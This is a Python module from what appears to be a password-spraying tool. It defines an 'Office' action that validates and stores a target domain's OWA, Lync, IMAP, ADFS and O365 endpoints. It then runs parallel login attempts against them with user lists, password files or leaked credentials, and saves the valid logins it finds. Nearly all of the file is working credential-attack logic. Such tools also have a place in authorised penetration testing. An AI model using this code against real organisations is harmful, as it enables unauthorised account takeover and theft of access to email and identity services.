import os.path
import traceback

from colorama import Fore

from actions.action import Action
from db.dao.endpoint import EndpointDao
from db.dao.login import LoginDao
from db.dao.user import UserDao
from db.enums.types import EndpointType
from db.models.endpoint import Endpoint
from enumerators.factories import OfficeEnumeratorFactory
from utils.utils import colors, progress, success, info, error


class Office(Action):
    def __init__(self, workspace):
        super().__init__(workspace)
        self.endpoint_types = ["owa", "lync", "imap", "adfs", "o365"]
        self.commands = ["attack", "add"]

    def execute(self, **kwargs):
        self.dbh.connect()
        u_dao = UserDao(handler=self.dbh)
        e_dao = EndpointDao(handler=self.dbh)
        s_dao = LoginDao(handler=self.dbh)

        command = kwargs["command"]
        if not command or command not in self.commands:
            command = self.choose_command()

        endpoint_type = kwargs["endpoint_type"]

        if (not endpoint_type or endpoint_type not in self.endpoint_types) and command != "add":
            info("Choose an endpoint type to attack, or all to attack any supported endpoint")
            endpoint_type = self.choose(self.endpoint_types + ["all"])

        if endpoint_type == "all":
            endpoint_type = None

        target = kwargs["domain"]

        use_leaks = kwargs["leaks"]
        passwords_file = kwargs["passwords_file"]
        if not passwords_file and not use_leaks and command == "attack":
            error("A password file should be given or define 'use leaks' instead")
            exit(1)
        passwords = None
        if passwords_file and os.path.isfile(passwords_file):
            passwords = [p.strip() for p in open(passwords_file).readlines()]

        # Get all registered endpoints
        endpoints = e_dao.list_all()
        # Get all registered users
        users = u_dao.list_all()

        if command == "attack":
            for endpoint in endpoints:
                if endpoint_type and EndpointType.get_name(endpoint.endpoint_type) != endpoint_type:
                    continue

                vpn_name = EndpointType.get_name(endpoint.endpoint_type)
                enumerator = OfficeEnumeratorFactory.from_name(vpn_name, endpoint.target)
                if not enumerator:
                    continue
                info(f"Running {enumerator.__class__.__name__}")
                enumerator.parallel_login(users=users, passwords=passwords, use_leaks=use_leaks)
                for login in enumerator.found:
                    s_dao.save_new(login["username"], login["password"], endpoint.target)
        if command == "add":

            if target is None:
                info("Please enter a target domain")
                target = self.wait_for_input()

            for vt in EndpointType.value_list():
                vpn_name = EndpointType.get_name(vt)
                enumerator = OfficeEnumeratorFactory.from_name(vpn_name, target, group="dummy")
                if not enumerator:
                    continue
                if enumerator.validate():
                    success(f"{target} is a valid {vpn_name.upper()} target!")
                    endpoint_type = vt
                    in_db = False
                    for e in endpoints:
                        if f"{e.target}:{e.endpoint_type}" == f"{target}:{endpoint_type}":
                            in_db = True
                    if not in_db:
                        endpoint = Endpoint(target=target, endpoint_type=endpoint_type, eid=0)
                        e_dao.save(endpoint)
                else:
                    error(f"{target} does not seem a valid {vpn_name.upper()} target")
